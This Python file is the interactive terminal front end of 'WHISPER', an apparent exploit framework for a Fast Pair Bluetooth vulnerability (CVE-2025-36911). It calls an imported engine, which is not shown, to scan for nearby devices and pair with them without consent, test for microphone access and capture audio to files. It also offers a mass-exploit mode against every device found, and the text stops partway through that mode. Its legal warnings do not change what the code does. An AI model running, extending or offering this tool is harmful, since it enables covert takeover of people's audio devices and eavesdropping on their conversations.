#!/usr/bin/env python3
"""
WHISPER - Interactive Terminal Interface
Real CVE-2025-36911 Exploitation Framework
"""

import asyncio
import os
import sys
import json
import time
import re
from datetime import datetime
from typing import List, Optional
import readline  # For better input handling

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from fast_pair_exploit import FastPairExploitEngine, FastPairDevice
    ENGINE_AVAILABLE = True
except ImportError as e:
    print(f"Error importing exploit engine: {e}")
    print("Make sure fast_pair_exploit.py exists in the current directory")
    ENGINE_AVAILABLE = False

class WhisperTerminal:
    """
    Interactive terminal interface for WHISPER
    """
    
    def __init__(self):
        if ENGINE_AVAILABLE:
            self.engine = FastPairExploitEngine()
        else:
            self.engine = None
        
        self.current_devices: List[FastPairDevice] = []
        self.running = True
        self.last_scan_time = None
        
        # Terminal colors
        self.COLOR = {
            'RED': '\033[91m',
            'GREEN': '\033[92m',
            'YELLOW': '\033[93m',
            'BLUE': '\033[94m',
            'MAGENTA': '\033[95m',
            'CYAN': '\033[96m',
            'WHITE': '\033[97m',
            'RESET': '\033[0m',
            'BOLD': '\033[1m'
        }
        
        # Check if engine is available
        if not ENGINE_AVAILABLE:
            self.print_error("Fast Pair Exploit Engine not available")
            self.print_error("Make sure fast_pair_exploit.py exists and dependencies are installed")
            self.print_error("Required: pip install bleak cryptography")
    
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        """Display WHISPER banner"""
        banner = f"""
{self.COLOR['CYAN']}{self.COLOR['BOLD']}
██╗    ██╗██╗  ██╗██╗███████╗██████╗ ███████╗██████╗ 
██║    ██║██║  ██║██║██╔════╝██╔══██╗██╔════╝██╔══██╗
██║ █╗ ██║███████║██║███████╗██████╔╝█████╗  ██████╔╝
██║███╗██║██╔══██║██║╚════██║██╔═══╝ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║  ██║██║███████║██║     ███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                                      
{self.COLOR['RESET']}{self.COLOR['YELLOW']}
    Wireless Hardware Inspection & Security Protocol Exploitation Research
    CVE-2025-36911 Exploit Framework - Linux Native Implementation
    Version 1.0 | For Authorized Security Research Only
{self.COLOR['RESET']}
"""
        print(banner)
    
    def print_error(self, message: str):
        """Print error message"""
        print(f"{self.COLOR['RED']}[!] {message}{self.COLOR['RESET']}")
    
    def print_success(self, message: str):
        """Print success message"""
        print(f"{self.COLOR['GREEN']}[+] {message}{self.COLOR['RESET']}")
    
    def print_warning(self, message: str):
        """Print warning message"""
        print(f"{self.COLOR['YELLOW']}[*] {message}{self.COLOR['RESET']}")
    
    def print_info(self, message: str):
        """Print info message"""
        print(f"{self.COLOR['CYAN']}[i] {message}{self.COLOR['RESET']}")
    
    def display_ethical_warning(self) -> bool:
        """Display ethical warning and get confirmation"""
        self.clear_screen()
        
        warning = f"""
{self.COLOR['RED']}{self.COLOR['BOLD']}
╔══════════════════════════════════════════════════════════════════════╗
║                      EXTREME ETHICAL WARNING                         ║
╚══════════════════════════════════════════════════════════════════════╝
{self.COLOR['RESET']}
WHISPER exploits CVE-2025-36911, a REAL vulnerability in Google's
Fast Pair protocol that allows:

{self.COLOR['RED']}• Unauthorized device pairing without user consent
• Potential microphone access via HFP profile
• Complete bypass of security controls{self.COLOR['RESET']}

{self.COLOR['RED']}{self.COLOR['BOLD']}UNAUTHORIZED USE IS ILLEGAL AND MAY RESULT IN:{self.COLOR['RESET']}
• Criminal prosecution (Computer Fraud and Abuse Act)
• Civil lawsuits for privacy violations  
• Wiretapping charges
• Severe legal consequences

{self.COLOR['YELLOW']}YOU MUST HAVE:{self.COLOR['RESET']}
1. Ownership of ALL target devices
2. Explicit written permission for testing
3. Compliance with ALL applicable laws
4. Authorization for security research

{self.COLOR['RED']}By using this tool, you accept FULL responsibility for your actions.{self.COLOR['RESET']}
"""
        print(warning)
        print(f"{self.COLOR['RED']}{'='*70}{self.COLOR['RESET']}")
        
        try:
            confirm = input(f"\n{self.COLOR['RED']}Type 'I ACCEPT RESPONSIBILITY' to continue: {self.COLOR['RESET']}").strip()
            return confirm == "I ACCEPT RESPONSIBILITY"
        except KeyboardInterrupt:
            return False
    
    def display_main_menu(self):
        """Display main interactive menu"""
        self.clear_screen()
        self.print_banner()
        
        # Show status
        if self.last_scan_time:
            print(f"{self.COLOR['CYAN']}Last scan: {self.last_scan_time}{self.COLOR['RESET']}")
            print(f"{self.COLOR['CYAN']}Devices in memory: {len(self.current_devices)}{self.COLOR['RESET']}")
        
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        print(f"{self.COLOR['BOLD']}MAIN MENU - REAL EXPLOIT FRAMEWORK{self.COLOR['RESET']}")
        print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        
        print(f"\n{self.COLOR['GREEN']}1.{self.COLOR['RESET']}  Scan for Fast Pair Devices")
        print(f"{self.COLOR['GREEN']}2.{self.COLOR['RESET']}  Continuous Bluetooth Scan (All Devices)")
        print(f"{self.COLOR['GREEN']}3.{self.COLOR['RESET']}  Target Specific Device by Address")
        print(f"{self.COLOR['GREEN']}4.{self.COLOR['RESET']}  View Discovered Devices")
        print(f"{self.COLOR['GREEN']}5.{self.COLOR['RESET']}  Exploit Specific Device")
        print(f"{self.COLOR['GREEN']}6.{self.COLOR['RESET']}  Exploit All Devices")
        print(f"{self.COLOR['GREEN']}7.{self.COLOR['RESET']}  Test HFP Connection")
        print(f"{self.COLOR['GREEN']}8.{self.COLOR['RESET']}  Capture Audio (if HFP available)")
        print(f"{self.COLOR['GREEN']}9.{self.COLOR['RESET']}  View Scan History")
        print(f"{self.COLOR['GREEN']}10.{self.COLOR['RESET']}  Clear Device List")
        print(f"{self.COLOR['GREEN']}0.{self.COLOR['RESET']}   Exit")
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        
        return input(f"\n{self.COLOR['CYAN']}Select option (0-10): {self.COLOR['RESET']}").strip()
    
    async def handle_continuous_scan(self):
        """Handle continuous Bluetooth scanning"""
        if not ENGINE_AVAILABLE:
            self.print_error("Exploit engine not available")
            input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
            return
        
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        print(f"{self.COLOR['BOLD']}CONTINUOUS BLUETOOTH SCAN{self.COLOR['RESET']}")
        print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        
        print(f"\n{self.COLOR['YELLOW']}This scan will show ALL Bluetooth devices")
        print(f"and highlight any Fast Pair devices in red.{self.COLOR['RESET']}")
        
        print(f"\n{self.COLOR['YELLOW']}Scan duration options:{self.COLOR['RESET']}")
        print(f"{self.COLOR['GREEN']}1.{self.COLOR['RESET']} Short scan (30 seconds)")
        print(f"{self.COLOR['GREEN']}2.{self.COLOR['RESET']} Medium scan (2 minutes)")
        print(f"{self.COLOR['GREEN']}3.{self.COLOR['RESET']} Long scan (5 minutes)")
        print(f"{self.COLOR['GREEN']}4.{self.COLOR['RESET']} Continuous (until stopped)")
        print(f"{self.COLOR['GREEN']}5.{self.COLOR['RESET']} Back to main menu")
        
        choice = input(f"\n{self.COLOR['CYAN']}Select scan type: {self.COLOR['RESET']}").strip()
        
        if choice == "5":
            return
        
        duration = 30
        
        if choice == "1":
            duration = 30
        elif choice == "2":
            duration = 120
        elif choice == "3":
            duration = 300
        elif choice == "4":
            duration = 3600  # 1 hour for "continuous"
            print(f"\n{self.COLOR['YELLOW']}Continuous mode - will run for up to 1 hour")
            print(f"Press Ctrl+C to stop early{self.COLOR['RESET']}")
        
        try:
            # Run continuous scan
            self.print_info(f"Starting continuous scan for {duration} seconds...")
            await asyncio.sleep(1)
            
            devices_found = await self.engine.continuous_scan(duration)
            
            # Update devices list with Fast Pair ones
            self.current_devices = devices_found
            
            if devices_found:
                self.print_success(f"Found {len(devices_found)} Fast Pair device(s) during continuous scan!")
                self.last_scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            else:
                self.print_warning("No Fast Pair devices found during continuous scan")
                
        except KeyboardInterrupt:
            self.print_warning("Continuous scan stopped by user")
        except Exception as e:
            self.print_error(f"Continuous scan failed: {e}")
            import traceback
            traceback.print_exc()
        
        input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
    
    async def handle_target_device(self):
        """Handle targeting a specific device by address"""
        if not ENGINE_AVAILABLE:
            self.print_error("Exploit engine not available")
            input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
            return
        
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        print(f"{self.COLOR['BOLD']}TARGET SPECIFIC DEVICE{self.COLOR['RESET']}")
        print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        
        print(f"\n{self.COLOR['YELLOW']}Enter device MAC address (format: XX:XX:XX:XX:XX:XX){self.COLOR['RESET']}")
        print(f"{self.COLOR['YELLOW']}Or enter 'scan' to scan for nearby devices first{self.COLOR['RESET']}")
        
        device_address = input(f"\n{self.COLOR['CYAN']}Device address: {self.COLOR['RESET']}").strip().upper()
        
        if device_address.lower() == 'scan':
            # Quick scan first
            print(f"\n{self.COLOR['YELLOW']}Quick scanning for devices (10 seconds)...{self.COLOR['RESET']}")
            devices = await self.engine.scan_devices(10)
            
            if devices:
                print(f"\n{self.COLOR['GREEN']}Found {len(devices)} device(s):{self.COLOR['RESET']}")
                for i, device in enumerate(devices, 1):
                    print(f"{i}. {device.name} ({device.address})")
                
                try:
                    choice = int(input(f"\n{self.COLOR['CYAN']}Select device number: {self.COLOR['RESET']}"))
                    if 1 <= choice <= len(devices):
                        device_address = devices[choice - 1].address
                    else:
                        self.print_error("Invalid selection")
                        return
                except ValueError:
                    self.print_error("Invalid input")
                    return
            else:
                self.print_warning("No devices found during scan")
                return
        
        # Validate MAC address format
        mac_pattern = re.compile(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$')
        
        if not mac_pattern.match(device_address):
            self.print_error("Invalid MAC address format")
            self.print_error("Expected format: XX:XX:XX:XX:XX:XX")
            input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
            return
        
        device_name = input(f"{self.COLOR['CYAN']}Device name (optional): {self.COLOR['RESET']}").strip()
        
        print(f"\n{self.COLOR['YELLOW']}Targeting device: {device_name or device_address}{self.COLOR['RESET']}")
        print(f"{self.COLOR['YELLOW']}This will attempt to connect and analyze the device...{self.COLOR['RESET']}")
        
        try:
            results = await self.engine.target_specific_device(device_address, device_name)
            
            print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
            print(f"{self.COLOR['BOLD']}TARGETING RESULTS{self.COLOR['RESET']}")
            print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
            
            if results.get("can_connect"):
                self.print_success(f"Successfully connected to {device_address}")
                
                print(f"{self.COLOR['CYAN']}Services found: {results.get('services_found', 0)}{self.COLOR['RESET']}")
                
                if results.get("is_fast_pair"):
                    self.print_success("DEVICE USES FAST PAIR!")
                    
                    if results.get("exploit_results"):
                        exploit = results["exploit_results"]
                        if exploit.get("success"):
                            self.print_success("EXPLOIT ATTEMPT SUCCESSFUL!")
                            print(f"{self.COLOR['GREEN']}Result: {exploit.get('exploit_result', 'Unknown')}{self.COLOR['RESET']}")
                        else:
                            self.print_warning("Exploit attempt completed")
                            if exploit.get("exploit_result"):
                                print(f"{self.COLOR['YELLOW']}Result: {exploit.get('exploit_result')}{self.COLOR['RESET']}")
                else:
                    self.print_warning("Device does not use Fast Pair")
                    
                    # Show services
                    if results.get("services"):
                        print(f"\n{self.COLOR['CYAN']}Device services:{self.COLOR['RESET']}")
                        for service in results["services"][:5]:  # Show first 5
                            print(f"  • {service['uuid']}")
                            if service['description']:
                                print(f"    Description: {service['description']}")
                        if len(results["services"]) > 5:
                            print(f"  ... and {len(results['services']) - 5} more services")
            else:
                self.print_error(f"Could not connect to {device_address}")
                if results.get("error"):
                    print(f"{self.COLOR['RED']}Error: {results['error']}{self.COLOR['RESET']}")
            
            # Show steps
            if results.get("steps"):
                print(f"\n{self.COLOR['CYAN']}Steps performed:{self.COLOR['RESET']}")
                for step in results["steps"]:
                    print(f"  • {step}")
                    
        except Exception as e:
            self.print_error(f"Targeting failed: {e}")
            import traceback
            traceback.print_exc()
        
        input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
    
    async def handle_scan(self):
        """Handle REAL device scanning"""
        if not ENGINE_AVAILABLE:
            self.print_error("Exploit engine not available")
            input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
            return
        
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        print(f"{self.COLOR['BOLD']}REAL FAST PAIR DEVICE SCAN{self.COLOR['RESET']}")
        print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        
        print(f"\n{self.COLOR['YELLOW']}Scan duration options:{self.COLOR['RESET']}")
        print(f"{self.COLOR['GREEN']}1.{self.COLOR['RESET']} Quick Scan (10 seconds)")
        print(f"{self.COLOR['GREEN']}2.{self.COLOR['RESET']} Standard Scan (30 seconds)")
        print(f"{self.COLOR['GREEN']}3.{self.COLOR['RESET']} Deep Scan (60 seconds)")
        print(f"{self.COLOR['GREEN']}4.{self.COLOR['RESET']} Custom duration")
        print(f"{self.COLOR['GREEN']}5.{self.COLOR['RESET']} Back to main menu")
        
        choice = input(f"\n{self.COLOR['CYAN']}Select scan type: {self.COLOR['RESET']}").strip()
        
        if choice == "5":
            return
        
        duration = 10
        
        if choice == "1":
            duration = 10
        elif choice == "2":
            duration = 30
        elif choice == "3":
            duration = 60
        elif choice == "4":
            try:
                duration = int(input(f"\n{self.COLOR['CYAN']}Enter scan duration in seconds (1-300): {self.COLOR['RESET']}"))
                if duration < 1 or duration > 300:
                    self.print_error("Duration must be between 1 and 300 seconds")
                    input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
                    return
            except ValueError:
                self.print_error("Invalid duration")
                input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
                return
        
        # Start REAL scan
        print(f"\n{self.COLOR['YELLOW']}Starting REAL Fast Pair scan for {duration} seconds...{self.COLOR['RESET']}")
        print(f"{self.COLOR['YELLOW']}Press Ctrl+C to stop early{self.COLOR['RESET']}")
        print()
        
        try:
            # Show scanning animation
            animation = ["[=     ]", "[ =    ]", "[  =   ]", "[   =  ]", "[    = ]", "[     =]", "[    = ]", "[   =  ]", "[  =   ]", "[ =    ]"]
            idx = 0
            
            # Run scan
            scan_task = asyncio.create_task(self.engine.scan_devices(duration))
            
            # Animation while scanning
            start_time = time.time()
            while not scan_task.done():
                elapsed = time.time() - start_time
                if elapsed > duration:
                    break
                    
                remaining = max(0, duration - elapsed)
                print(f"\r{self.COLOR['CYAN']}Scanning {animation[idx % len(animation)]} {remaining:.0f}s remaining{self.COLOR['RESET']}", end="", flush=True)
                idx += 1
                await asyncio.sleep(0.1)
            
            # Get results
            self.current_devices = await scan_task
            
            # Update last scan time
            self.last_scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            print(f"\r{' ' * 80}\r", end="")  # Clear animation line
            
            if self.current_devices:
                self.print_success(f"Found {len(self.current_devices)} REAL Fast Pair device(s)!")
                print()
                
                # Show quick summary
                for i, device in enumerate(self.current_devices, 1):
                    if "CRITICAL" in device.vulnerability_status or "HIGH" in device.vulnerability_status:
                        vuln_color = self.COLOR['RED']
                    elif "MEDIUM" in device.vulnerability_status:
                        vuln_color = self.COLOR['YELLOW']
                    else:
                        vuln_color = self.COLOR['GREEN']
                    
                    print(f"{self.COLOR['GREEN']}{i}.{self.COLOR['RESET']} {device.name}")
                    print(f"   {self.COLOR['CYAN']}Address:{self.COLOR['RESET']} {device.address}")
                    print(f"   {self.COLOR['CYAN']}RSSI:{self.COLOR['RESET']} {device.rssi} dBm")
                    print(f"   {self.COLOR['CYAN']}Model:{self.COLOR['RESET']} {device.model_id}")
                    print(f"   {self.COLOR['CYAN']}Vulnerability:{self.COLOR['RESET']} {vuln_color}{device.vulnerability_status}{self.COLOR['RESET']}")
                    print(f"   {self.COLOR['CYAN']}Score:{self.COLOR['RESET']} {device.vulnerability_score}/100")
                    print()
            else:
                self.print_warning("No Fast Pair devices found")
                
        except KeyboardInterrupt:
            self.print_warning("Scan stopped by user")
        except Exception as e:
            self.print_error(f"Scan failed: {e}")
            import traceback
            traceback.print_exc()
        
        input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
    
    def handle_view_devices(self):
        """Display discovered devices in detail"""
        if not self.current_devices:
            self.print_error("No devices found. Please scan first.")
            input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
            return
        
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        print(f"{self.COLOR['BOLD']}DISCOVERED DEVICES ({len(self.current_devices)}){self.COLOR['RESET']}")
        print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        
        for i, device in enumerate(self.current_devices, 1):
            if "CRITICAL" in device.vulnerability_status or "HIGH" in device.vulnerability_status:
                vuln_color = self.COLOR['RED']
            elif "MEDIUM" in device.vulnerability_status:
                vuln_color = self.COLOR['YELLOW']
            else:
                vuln_color = self.COLOR['GREEN']
            
            print(f"\n{self.COLOR['GREEN']}{'='*50}{self.COLOR['RESET']}")
            print(f"{self.COLOR['BOLD']}Device #{i}: {device.name}{self.COLOR['RESET']}")
            print(f"{self.COLOR['GREEN']}{'='*50}{self.COLOR['RESET']}")
            
            print(f"{self.COLOR['CYAN']}MAC Address:{self.COLOR['RESET']} {device.address}")
            print(f"{self.COLOR['CYAN']}RSSI:{self.COLOR['RESET']} {device.rssi} dBm")
            print(f"{self.COLOR['CYAN']}Model ID:{self.COLOR['RESET']} {device.model_id}")
            print(f"{self.COLOR['CYAN']}Flags:{self.COLOR['RESET']} 0x{device.flags:02X} ({device.flags:08b})")
            print(f"{self.COLOR['CYAN']}TX Power:{self.COLOR['RESET']} {device.tx_power}")
            print(f"{self.COLOR['CYAN']}Discovered:{self.COLOR['RESET']} {device.discovered_at}")
            print(f"{self.COLOR['CYAN']}Vulnerability:{self.COLOR['RESET']} {vuln_color}{device.vulnerability_status}{self.COLOR['RESET']}")
            print(f"{self.COLOR['CYAN']}Score:{self.COLOR['RESET']} {device.vulnerability_score}/100")
            
            if device.vulnerability_reasons:
                print(f"{self.COLOR['CYAN']}Reasons:{self.COLOR['RESET']}")
                for reason in device.vulnerability_reasons:
                    print(f"  • {reason}")
            
            if device.manufacturer_data:
                print(f"{self.COLOR['CYAN']}Manufacturer Data:{self.COLOR['RESET']}")
                for mfg_id, data in device.manufacturer_data.items():
                    print(f"  {mfg_id}: {data}")
            
            if device.services:
                print(f"{self.COLOR['CYAN']}Services:{self.COLOR['RESET']}")
                for service in device.services[:5]:  # Show first 5
                    print(f"  {service}")
                if len(device.services) > 5:
                    print(f"  ... and {len(device.services) - 5} more")
        
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
    
    async def handle_exploit_device(self):
        """Handle REAL exploit of specific device"""
        if not ENGINE_AVAILABLE:
            self.print_error("Exploit engine not available")
            input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
            return
        
        if not self.current_devices:
            self.print_error("No devices found. Please scan first.")
            input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
            return
        
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        print(f"{self.COLOR['BOLD']}REAL DEVICE EXPLOIT - CVE-2025-36911{self.COLOR['RESET']}")
        print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        
        # Show device list
        print(f"\n{self.COLOR['YELLOW']}Select device to exploit:{self.COLOR['RESET']}")
        for i, device in enumerate(self.current_devices, 1):
            if "CRITICAL" in device.vulnerability_status or "HIGH" in device.vulnerability_status:
                vuln_color = self.COLOR['RED']
            elif "MEDIUM" in device.vulnerability_status:
                vuln_color = self.COLOR['YELLOW']
            else:
                vuln_color = self.COLOR['GREEN']
            
            print(f"{self.COLOR['GREEN']}{i}.{self.COLOR['RESET']} {device.name} ({device.address})")
            print(f"   Model: {device.model_id}, RSSI: {device.rssi}dBm")
            print(f"   Vulnerability: {vuln_color}{device.vulnerability_status}{self.COLOR['RESET']}")
            print()
        
        print(f"{self.COLOR['GREEN']}0.{self.COLOR['RESET']} Back to main menu")
        
        try:
            choice = int(input(f"\n{self.COLOR['CYAN']}Select device number: {self.COLOR['RESET']}"))
            
            if choice == 0:
                return
            
            if 1 <= choice <= len(self.current_devices):
                device = self.current_devices[choice - 1]
                
                # Show target details
                print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
                print(f"{self.COLOR['BOLD']}TARGET SELECTED{self.COLOR['RESET']}")
                print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
                print(f"{self.COLOR['CYAN']}Name:{self.COLOR['RESET']} {device.name}")
                print(f"{self.COLOR['CYAN']}Address:{self.COLOR['RESET']} {device.address}")
                print(f"{self.COLOR['CYAN']}Model ID:{self.COLOR['RESET']} {device.model_id}")
                print(f"{self.COLOR['CYAN']}Vulnerability:{self.COLOR['RESET']} {device.vulnerability_status}")
                print(f"{self.COLOR['CYAN']}Score:{self.COLOR['RESET']} {device.vulnerability_score}/100")
                
                # Extreme warning
                print(f"\n{self.COLOR['RED']}{'='*70}{self.COLOR['RESET']}")
                print(f"{self.COLOR['RED']}{self.COLOR['BOLD']}⚠️  REAL EXPLOIT ATTEMPT - LEGAL WARNING ⚠️{self.COLOR['RESET']}")
                print(f"{self.COLOR['RED']}{'='*70}{self.COLOR['RESET']}")
                print(f"\n{self.COLOR['YELLOW']}This will attempt REAL exploitation of CVE-2025-36911")
                print(f"It may:")
                print(f"• Pair with the device without user consent")
                print(f"• Establish HFP connection for microphone access")
                print(f"• Potentially capture audio from the device")
                print(f"\n{self.COLOR['RED']}USE ONLY ON DEVICES YOU OWN OR HAVE PERMISSION TO TEST!{self.COLOR['RESET']}")
                print(f"{self.COLOR['RED']}UNAUTHORIZED USE IS ILLEGAL!{self.COLOR['RESET']}")
                
                confirm = input(f"\n{self.COLOR['RED']}Type 'EXPLOIT' to proceed: {self.COLOR['RESET']}").strip()
                
                if confirm == "EXPLOIT":
                    print(f"\n{self.COLOR['YELLOW']}Starting REAL exploit attempt...{self.COLOR['RESET']}")
                    
                    # Run REAL exploit
                    results = await self.engine.exploit_device(device.address, device.name)
                    
                    print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
                    print(f"{self.COLOR['BOLD']}EXPLOIT RESULTS{self.COLOR['RESET']}")
                    print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
                    
                    if results.get("success"):
                        self.print_success("REAL EXPLOIT SUCCESSFUL!")
                        self.print_success("Device may be paired without user consent")
                        
                        if results.get("exploit_result"):
                            print(f"{self.COLOR['GREEN']}Result: {results['exploit_result']}{self.COLOR['RESET']}")
                        
                        # Offer HFP test
                        hfp_test = input(f"\n{self.COLOR['CYAN']}Test HFP connection for microphone access? (y/n): {self.COLOR['RESET']}").lower()
                        if hfp_test == 'y':
                            print(f"\n{self.COLOR['YELLOW']}Testing HFP connection...{self.COLOR['RESET']}")
                            hfp_results = await self.engine.test_hfp_connection(device.address)
                            
                            if hfp_results.get("audio_access"):
                                self.print_success("HFP AUDIO ACCESS CONFIRMED!")
                                self.print_warning("⚠️  MICROPHONE ACCESS MAY BE POSSIBLE!")
                                
                                # Offer audio capture
                                capture_test = input(f"\n{self.COLOR['CYAN']}Attempt audio capture? (y/n): {self.COLOR['RESET']}").lower()
                                if capture_test == 'y':
                                    duration = input(f"{self.COLOR['CYAN']}Capture duration in seconds (1-30): {self.COLOR['RESET']}").strip()
                                    try:
                                        duration = int(duration) if duration else 10
                                        duration = max(1, min(30, duration))
                                        
                                        print(f"\n{self.COLOR['YELLOW']}Attempting audio capture for {duration} seconds...{self.COLOR['RESET']}")
                                        capture_results = await self.engine.capture_audio(device.address, duration)
                                        
                                        if capture_results.get("capture_success"):
                                            self.print_success(f"AUDIO CAPTURE SUCCESSFUL!")
                                            print(f"{self.COLOR['GREEN']}Audio saved to: {capture_results['audio_file']}{self.COLOR['RESET']}")
                                            print(f"{self.COLOR['GREEN']}File size: {capture_results.get('file_size', 0)} bytes{self.COLOR['RESET']}")
                                        else:
                                            self.print_warning("Audio capture failed")
                                            if capture_results.get("error"):
                                                print(f"{self.COLOR['YELLOW']}Error: {capture_results['error']}{self.COLOR['RESET']}")
                                                
                                    except ValueError:
                                        self.print_error("Invalid duration")
                            else:
                                self.print_warning("HFP access not available")
                                if hfp_results.get("error"):
                                    print(f"{self.COLOR['YELLOW']}Error: {hfp_results['error']}{self.COLOR['RESET']}")
                    
                    else:
                        self.print_warning("Exploit attempt completed")
                        if results.get("exploit_result"):
                            print(f"{self.COLOR['YELLOW']}Result: {results['exploit_result']}{self.COLOR['RESET']}")
                        
                        if results.get("error"):
                            print(f"{self.COLOR['RED']}Error: {results['error']}{self.COLOR['RESET']}")
                    
                    # Show steps
                    if results.get("steps"):
                        print(f"\n{self.COLOR['CYAN']}Steps performed:{self.COLOR['RESET']}")
                        for step in results["steps"]:
                            print(f"  • {step}")
                
                else:
                    self.print_warning("Exploit cancelled")
                    
            else:
                self.print_error("Invalid device number")
                
        except ValueError:
            self.print_error("Invalid input")
        except Exception as e:
            self.print_error(f"Error: {e}")
            import traceback
            traceback.print_exc()
        
        input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
    
    async def handle_exploit_all(self):
        """Handle REAL exploit of all devices"""
        if not ENGINE_AVAILABLE:
            self.print_error("Exploit engine not available")
            input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
            return
        
        if not self.current_devices:
            self.print_error("No devices found. Please scan first.")
            input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
            return
        
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        print(f"{self.COLOR['BOLD']}MASS EXPLOIT - ALL DEVICES{self.COLOR['RESET']}")
        print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        
        # Count vulnerable devices
        critical_count = sum(1 for d in self.current_devices if "CRITICAL" in d.vulnerability_status)
        high_count = sum(1 for d in self.current_devices if "HIGH" in d.vulnerability_status)
        medium_count = sum(1 for d in self.current_devices if "MEDIUM" in d.vulnerability_status)
        
        print(f"\n{self.COLOR['YELLOW']}Devices to exploit: {len(self.current_devices)}{self.COLOR['RESET']}")
        print(f"{self.COLOR['RED']}CRITICAL vulnerability: {critical_count}{self.COLOR['RESET']}")
        print(f"{self.COLOR['YELLOW']}HIGH vulnerability: {high_count}{self.COLOR['RESET']}")
        print(f"{self.COLOR['GREEN']}MEDIUM vulnerability: {medium_count}{self.COLOR['RESET']}")
        
        # Extreme warning
        print(f"\n{self.COLOR['RED']}{'='*70}{self.COLOR['RESET']}")
        print(f"{self.COLOR['RED']}{self.COLOR['BOLD']}⚠️  MASS EXPLOIT - EXTREME LEGAL WARNING ⚠️{self.COLOR['RESET']}")
        print(f"{self.COLOR['RED']}{'='*70}{self.COLOR['RESET']}")
        print(f"\n{self.COLOR['YELLOW']}This will attempt to exploit ALL {len(self.current_devices)} devices!")
        print(f"It may:")
        print(f"• Pair with MULTIPLE devices without consent")
        print(f"• Establish HFP connections to multiple devices")
        print(f"• Potentially capture audio from vulnerable devices")
        print(f"\n{self.COLOR['RED']}USE ONLY ON DEVICES YOU OWN OR HAVE PERMISSION TO TEST!{self.COLOR['RESET']}")
        print(f"{self.COLOR['RED']}UNAUTHORIZED USE IS ILLEGAL!{self.COLOR['RESET']}")
        
        confirm = input(f"\n{self.COLOR['RED']}Type 'MASS EXPLOIT' to proceed: {self.COLOR['RESET']}").strip()
        
        if confirm == "MASS EXPLOIT":
            results = []
            
            for i, device in enumerate(self.current_devices, 1):
                print(f"\n{self.COLOR['BLUE']}{'='*50}{self.COLOR['RESET']}")
                print(f"{self.COLOR['BOLD']}Device {i}/{len(self.current_devices)}: {device.name}{self.COLOR['RESET']}")
                print(f"{self.COLOR['BLUE']}{'='*50}{self.COLOR['RESET']}")
                
                print(f"{self.COLOR['CYAN']}Vulnerability: {device.vulnerability_status}{self.COLOR['RESET']}")
                print(f"{self.COLOR['CYAN']}Score: {device.vulnerability_score}/100{self.COLOR['RESET']}")
                
                print(f"{self.COLOR['YELLOW']}Attempting exploit...{self.COLOR['RESET']}")
                
                # Run exploit
                exploit_results = await self.engine.exploit_device(device.address, device.name)
                
                if exploit_results.get("success"):
                    self.print_success(f"Exploit successful for {device.name}")
                    results.append({
                        "device": device.to_dict(),
                        "success": True,
                        "details": exploit_results
                    })
                else:
                    self.print_warning(f"Exploit failed for {device.name}")
